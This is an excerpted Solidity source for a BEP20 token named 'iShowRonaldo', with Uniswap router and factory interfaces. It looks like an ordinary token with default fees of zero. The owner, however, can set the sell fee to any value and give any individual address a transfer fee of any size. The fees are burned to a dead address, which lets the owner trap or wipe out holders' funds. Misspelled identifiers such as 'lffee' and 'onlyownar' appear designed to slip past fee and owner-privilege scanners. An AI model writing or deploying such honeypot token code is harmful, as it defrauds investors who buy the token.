...
interface IUniswapV2Factory {
    ...
    function lffeeTo() external view returns (address);
    function lffeeToSetter() external view returns (address);
    ...
    function setlffeeTo(address) external;
    function setlffeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinglffeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinglffeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinglffeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinglffeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglffeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract iShowRonaldo is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelllffee = 0;

    uint256 private _defaultBuylffee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliplffee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelllffee = _value;
    }

    function setSliplffee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliplffee[_address] = _value;
    }

    function getSliplffee(address _address) external view onlyownar returns (uint256) {
        return _sliplffee[_address];
    }


    function setMAccountlffee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountlffee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradelffeeAmount = 0;

        if (rF) {
            uint256 tradelffee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradelffee = _defaultSelllffee;
                }
                if (from == uniswapV2Pair) {

                    tradelffee = _defaultBuylffee;
                }
            }
            if (_sliplffee[from] > 0) {
                tradelffee = _sliplffee[from];
            }

            tradelffeeAmount = _Amount.mul(tradelffee).div(100);
        }


        if (tradelffeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradelffeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradelffeeAmount);
            emit Transfer(from, _deadAddress, tradelffeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradelffeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradelffeeAmount);
        emit Transfer(from, _to, _Amount - tradelffeeAmount);
    }
